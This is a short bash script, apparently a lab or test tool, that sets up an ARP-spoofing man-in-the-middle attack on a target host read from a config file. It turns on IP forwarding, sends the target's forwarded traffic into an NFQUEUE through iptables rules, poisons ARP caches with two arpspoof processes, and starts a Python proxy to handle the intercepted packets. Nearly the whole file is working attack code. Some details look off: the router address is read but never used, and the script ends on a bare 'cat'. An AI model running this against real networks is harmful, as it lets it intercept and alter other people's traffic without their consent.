#!/bin/bash

if [[ $EUID -ne 0 ]]; then
  echo "Please run as root"
  exit 1
fi

target=$(jq -r '.target' config.json)
router=$(jq -r '.router' config.json)
attacker=$(jq -r '.attacker' config.json)
interface=$(jq -r '.interface' config.json)

trap 'end' INT

function end() {
  echo "Shutdown now..."
  kill $PID1
  kill $PID2
  kill $PID3
  iptables -F
  wait $PID1
  wait $PID2
  wait $PID3
}

echo 1 > /proc/sys/net/ipv4/ip_forward

sudo iptables -A FORWARD -d $target -j NFQUEUE --queue-num 0
sudo iptables -A FORWARD -s $target -j NFQUEUE --queue-num 0

# Start arpspoof commands in the background
arpspoof -i $interface -t $target $attacker > arpspoof.log 2>&1 &
PID1=$!
arpspoof -i $interface -t $attacker $target > arpspoof.log 2>&1 &
PID2=$!

python3 proxy-test.py 2>&1 &
PID3=$!

cat
